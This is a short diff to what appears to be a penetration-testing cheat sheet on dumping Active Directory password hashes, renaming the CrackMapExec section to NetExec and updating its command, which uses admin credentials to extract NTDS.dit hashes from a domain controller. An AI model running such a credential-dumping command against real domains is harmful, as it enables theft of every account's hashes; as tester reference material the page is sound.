@@ -10,11 +10,11 @@ NTDS.dit contains all the info on the domain (hashes...).
 
 </details>
 
-## cme
+## netexec
 
 ```bash
 # dump ntds on domain controller
-cme smb $dc_ip -u $admin_user -p $pass --ntds
+nxc smb $dc_ip -u $admin_user -p $pass --ntds
 ```
 
 ## FGDump
